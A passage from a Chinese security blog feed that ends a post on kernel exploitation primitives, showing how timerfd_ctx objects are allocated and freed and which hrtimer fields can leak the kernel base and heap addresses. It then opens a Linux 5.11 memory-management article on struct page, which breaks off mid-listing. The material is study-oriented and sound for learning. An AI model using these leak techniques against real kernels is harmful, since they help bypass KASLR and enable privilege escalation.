<code>hrtimer</code> 结构体定义于 <code>/include/linux/hrtimer.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerqueue_node</span>        <span class="title">node</span>;</span></span><br><span class="line">    <span class="type">ktime_t</span>                _softexpires;</span><br><span class="line">    <span class="keyword">enum</span> <span class="title function_">hrtimer_restart</span>        <span class="params">(*function)</span><span class="params">(<span class="keyword">struct</span> hrtimer *)</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer_clock_base</span>    *<span class="title">base</span>;</span></span><br><span class="line">    u8                state;</span><br><span class="line">    u8                is_rel;</span><br><span class="line">    u8                is_soft;</span><br><span class="line">    u8                is_hard;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="分配-x2F-释放-2"><a href="#分配-x2F-释放-2" class="headerlink" title="分配&#x2F;释放"></a>分配&#x2F;释放</h3><p>我们可以通过 <code>timerfd_create</code> 系统调用来分配一个 <code>timerfd_ctx</code> 结构体，在 <code>fs/timerfd.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(timerfd_create, <span class="type">int</span>, clockid, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ufd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ctx = kzalloc(<span class="keyword">sizeof</span>(*ctx), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样地，对于 timerfd 文件在 <code>fs/timerfd.c</code> 中定义了其函数表 <code>timerfd_ops</code>，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">timerfd_fops</span> =</span> &#123;</span><br><span class="line">    .release    = timerfd_release,</span><br><span class="line">    .poll        = timerfd_poll,</span><br><span class="line">    .read        = timerfd_read,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .show_fdinfo    = timerfd_show,</span><br><span class="line">    .unlocked_ioctl    = timerfd_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中 <code>timerfd_release</code> 定义于 <code>fs/timerfd.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">timerfd_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    timerfd_remove_cancel(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isalarm(ctx))</span><br><span class="line">        alarm_cancel(&amp;ctx-&gt;t.alarm);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hrtimer_cancel(&amp;ctx-&gt;t.tmr);</span><br><span class="line">    kfree_rcu(ctx, rcu);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即我们可以通过关闭 timerfd 文件来释放 timerfd_ctx 结构体</p><h3 id="数据泄露-7"><a href="#数据泄露-7" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-5"><a href="#内核-text-段地址-5" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>timerfd_ctx 的 tmr 字段的 <code>function</code> 字段指向内核代码段（笔者尚未求证具体指向函数），若能泄漏出该指针则我们便毫无疑问能泄漏出内核基址</p><h4 id="内核线性映射区（-direct-mapping-area）-4"><a href="#内核线性映射区（-direct-mapping-area）-4" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>timerfd_ctx 的 tmr 字段的 <code>base</code> 字段指向内核“堆”上，若能泄露该字段我们同样能泄漏出内核的“堆上地址”</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我是小小做题家&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://blog.arttnba3.cn/categories/PWN/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x02】Linux Kernel 内存管理浅析 I - 页、区、节点</title>
    <link href="http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/</id>
    <published>2021-11-27T18:45:29.000Z</published>
    <updated>2022-07-05T16:34:52.342Z</updated>
    
    <content type="html"><![CDATA[<p>无内鬼，来点内存条</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本系列文章将通过 Linux 5.11 的源代码简要分析 Linux 内核中的<strong>内存管理</strong>（memory management）部分，笔者选择采用自底向上的方式来逐层分析，本篇文章便从最基础的<strong>页框</strong>开始进行分析</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>这是一张十分经典的 _Overview_，自顶向下是</p><ul><li><strong>节点</strong>（node，对应结构体 pgdata_list）</li><li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li><li><strong>页</strong>（page，对应结构体 page）</li></ul><p><img src="https://i.loli.net/2021/11/28/OrsvS6GTMgPLx5E.png" alt="image.png"></p><p>我们可以通过 <code>cat /proc/buddyinfo</code> 与 <code>cat /proc/pagetypeinfo</code> 查看页面相关信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">arttnba3@ubuntu:~$ sudo cat /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      1      1      0      2      1      1      0      1      2      2 </span><br><span class="line">Node 0, zone    DMA32   8706   1386    748    543    232     48     39      9      0      0      0 </span><br><span class="line">Node 0, zone   Normal  15391   3317    877    826    221     77     14      2      0      0      0 </span><br><span class="line">arttnba3@ubuntu:~$ sudo cat /proc/pagetypeinfo </span><br><span class="line">Page block order: 9</span><br><span class="line">Pages per block:  512</span><br><span class="line"></span><br><span class="line">Free pages count per migrate type at order       0      1      2      3      4      5      6      7      8      9     10 </span><br><span class="line">Node    0, zone      DMA, type    Unmovable      0      1      1      0      2      1      1      0      1      1      0 </span><br><span class="line">Node    0, zone      DMA, type      Movable      0      0      0      0      0      0      0      0      0      1      2 </span><br><span class="line">Node    0, zone      DMA, type  Reclaimable      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone      DMA, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone      DMA, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type    Unmovable    254    166     54     33     18      8     11      1      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type      Movable   6762    740    535    278     43      3      3      2      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type  Reclaimable   1690    480    159    232    171     37     25      6      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type    Unmovable     27     30     15      0      1      4      4      2      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type      Movable  12963   3039    806    727    197     68     10      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type  Reclaimable   1135    251     56     99     23      5      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line"></span><br><span class="line">Number of blocks type     Unmovable      Movable  Reclaimable   HighAtomic      Isolate </span><br><span class="line">Node 0, zone      DMA            3            5            0            0            0 </span><br><span class="line">Node 0, zone    DMA32           60         1382           86            0            0 </span><br><span class="line">Node 0, zone   Normal          245         4270           93            0            0</span><br></pre></td></tr></table></figure><h1 id="0x01-struct-page：页"><a href="#0x01-struct-page：页" class="headerlink" title="0x01.struct page：页"></a>0x01.struct page：页</h1><p>Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>，为了节省内存空间，其定义中使用了大量的联合体</p><p>一个 page 结构体的大小为 64B，若是每个物理页框大小为 4KB，则仅需要牺牲 <code>1.5625%</code> 的空间存储 page 结构体</p><p>在这里给出一张 struct page 的overview</p><blockquote><p>网上找的图，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/MjWZmba9SLH1xIO.png" alt="image.png"></p><p>该结构体定义于内核源码 <code>include/linux/mm_types.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// flags 用以存储该 page 的标志位，每一个位表示一种状态，故一张页可以有 32 种状态，这些状态定义于 include/linux/page-flags.h 中</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* 原子变量 flag，也可能被异步更新 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 该联合体中 5 个 word（32 位系统20字节/64位系统40字节）是可用的</span></span><br><span class="line"><span class="comment">     * 警告：第一个 word 的 0 bit 供 PageTail()使用</span></span><br><span class="line"><span class="comment">     * 这意味着其他用户使用该结构体时【禁止】使用该 bit</span></span><br><span class="line"><span class="comment">     * 以避免碰撞和误判 PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* 页缓存与匿名页 */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @lru: Pageout 链表, 例如 active_list 便由</span></span><br><span class="line"><span class="comment">             * lruvec-&gt;lru_lock 保护。  </span></span><br><span class="line"><span class="comment">             * 有时会被页所有者作为常规链表使用。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">            <span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;        <span class="comment">/* 在映射的虚拟空间（vma_area）内的偏移 */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @private: 私有映射的非透明数据</span></span><br><span class="line"><span class="comment">             * 在 PagePrivate 中通常用于 buffer_heads.</span></span><br><span class="line"><span class="comment">             * 在 PageSwapCache 中用于 swp_entry_t</span></span><br><span class="line"><span class="comment">             * 在 PageBuddy 中指定在 buddy system 中的次序</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* page_pool used by netstack */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @dma_addr: 在 32 位机器上仍可能需要 64 位的空间</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">dma_addr_t</span> dma_addr;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* 供 slab, slob and slub 使用 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Partial pages */</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">                    <span class="type">int</span> pages;    <span class="comment">/* 剩余的页数量 */</span></span><br><span class="line">                    <span class="type">int</span> pobjects;    <span class="comment">/* 近似计数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* 不在 slob 中使用 */</span></span><br><span class="line">            <span class="comment">/* 两个 word 的范围 */</span></span><br><span class="line">            <span class="type">void</span> *freelist;        <span class="comment">/* 第一个空闲对象 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span> *s_mem;    <span class="comment">/* slab: first object */</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> counters;        <span class="comment">/* SLUB */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>            <span class="comment">/* SLUB */</span></span><br><span class="line">                    <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                    <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                    <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* 复合页的尾页 */</span></span><br><span class="line">            <span class="comment">// 复合页 （compound page）即为将多个物理连续页框视作一个大页</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head;    <span class="comment">/* Bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_order;</span><br><span class="line">            <span class="type">atomic_t</span> compound_mapcount;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_nr; <span class="comment">/* 1 &lt;&lt; compound_order */</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Second tail page of compound page */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _compound_pad_1;    <span class="comment">/* compound_head */</span></span><br><span class="line">            <span class="type">atomic_t</span> hpage_pinned_refcount;</span><br><span class="line">            <span class="comment">/* For both global and memcg */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* 页表页面 */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_1;    <span class="comment">/* compound_head */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_2;    <span class="comment">/* mapping */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* 用于 x86 的全局目录表（pgd） */</span></span><br><span class="line">                <span class="type">atomic_t</span> pt_frag_refcount; <span class="comment">/* 用于 powerpc 架构 */</span></span><br><span class="line">            &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">            <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line">            <span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line">            <span class="type">void</span> *zone_device_data;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment">             * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment">             * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment">             * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment">             * private memory.</span></span><br><span class="line"><span class="comment">             * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment">             * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment">             * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** @rcu_head: 你可以通过该成员以通过 RCU 释放内存页 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span>        <span class="comment">/* 这个联合体占用四个字节 */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若是这个页被映射到用户空间, 记录该页被页表引用的次数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// 每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，初始值为 -1</span></span><br><span class="line">        <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 若是该页既不是 PageSlab 也没有被映射到用户空间，</span></span><br><span class="line"><span class="comment">         * 则该值会帮助决定该页的作用。</span></span><br><span class="line"><span class="comment">         * 该处的页面类型列表参见 page-flags.h</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> active;        <span class="comment">/* SLAB */</span></span><br><span class="line">        <span class="type">int</span> units;            <span class="comment">/* SLOB */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 使用计数. 【不要直接使用】. 参见 page_ref.h */</span></span><br><span class="line">    <span class="type">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 当机器上的所有内存都被映射到内核空间时,</span></span><br><span class="line"><span class="comment">     * 我们可以简单地计算其虚拟地址。</span></span><br><span class="line"><span class="comment">     * 在有着【高端内存（大于896MB）】的机器上，有的内存被动态地映射到内核</span></span><br><span class="line"><span class="comment">     * 虚拟空间中，因此我们需要一个地方来存储这个地址</span></span><br><span class="line"><span class="comment">     * 在 x86 机器上这个域可能占 16 bit 的空间 ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 乘法计算较慢的架构可以在 asm/page.h 中定义 WANT_PAGE_VIRTUAL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;            <span class="comment">/* 内核虚拟地址 (若非 kmapped 则为 NULL, 即高端内存) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line">    <span class="type">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><h2 id="I-几个比较重要的字段"><a href="#I-几个比较重要的字段" class="headerlink" title="I.几个比较重要的字段"></a>I.几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="lru：LRU-链表节点"><a href="#lru：LRU-链表节点" class="headerlink" title="lru：LRU 链表节点"></a>lru：LRU 链表节点</h3><p>lru 即 <code>Least Recently Used</code>，在操作系统课程上我们已经学习了这个页面置换算法的概念，这里不再过多赘叙</p><p>在 Linux 内核中，page 结构体通过其 lru 字段组织成链表，如下图所示</p><p><img src="https://i.loli.net/2021/11/25/QbuxcXTWdzMari5.png" alt="image.png"></p><p>lru 成员是一个 <code>struct list_head</code> 类型，这是内核中通用的双向链表节点结构</p><h3 id="slab相关结构体"><a href="#slab相关结构体" class="headerlink" title="**slab相关结构体**"></a>**slab相关结构体**</h3><p>在 page 结构体中专门有着一个匿名结构体用于存放与 slab 相关的成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* 供 slab, slob and slub 使用 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Partial pages */</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">                    <span class="type">int</span> pages;    <span class="comment">/* 剩余的页数量 */</span></span><br><span class="line">                    <span class="type">int</span> pobjects;    <span class="comment">/* 近似计数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* 不在 slob 中使用 */</span></span><br><span class="line">            <span class="comment">/* 两个 word 的范围 */</span></span><br><span class="line">            <span class="type">void</span> 